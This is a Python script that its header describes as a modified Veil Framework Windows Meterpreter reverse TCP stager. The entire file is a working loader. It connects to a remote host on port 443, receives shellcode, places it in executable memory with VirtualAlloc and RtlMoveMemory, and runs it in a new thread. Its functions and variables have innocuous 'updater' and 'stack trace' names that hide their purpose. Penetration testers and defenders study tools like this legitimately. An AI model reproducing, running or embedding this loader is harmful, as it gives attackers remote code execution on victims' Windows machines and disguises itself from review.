#!/usr/bin/env python
#
# Copyright (C) 2016 David Evenden (@jedimammoth)
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
#
#This is a modified version of the encoded Python Windows Meterperter Reverse TCP agent created by the Veil Framework

import struct, socket, binascii, ctypes, random, time
sysUpdater, appUpdater = None, None
def startUpdater():
        try:
                global appUpdater
                appUpdater = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                appUpdater.connect(('10.10.10.100', 443))
                sysrotate = struct.pack('<i', appUpdater.fileno())
                l = struct.unpack('<i', str(appUpdater.recv(4)))[0]
                callUpdater = "     "
                while len(callUpdater) < l: callUpdater += appUpdater.recv(l)
                javaConfigUpdater = ctypes.create_string_buffer(callUpdater, len(callUpdater))
                javaConfigUpdater[0] = binascii.unhexlify('BF')
                for i in xrange(4): javaConfigUpdater[i+1] = sysrotate[i]
                return javaConfigUpdater
        except: return None
def collectResults(processResults):
        if processResults != None:
                performStackTrace = bytearray(processResults)
                rotateStackTraceUpdater = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(performStackTrace)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
                ctypes.windll.kernel32.VirtualLock(ctypes.c_int(rotateStackTraceUpdater), ctypes.c_int(len(performStackTrace)))
                recallStackTraceUpdater = (ctypes.c_char * len(performStackTrace)).from_buffer(performStackTrace)
                ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(rotateStackTraceUpdater), recallStackTraceUpdater, ctypes.c_int(len(performStackTrace)))
                ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(rotateStackTraceUpdater),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
                ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
sysUpdater = startUpdater()
collectResults(sysUpdater)
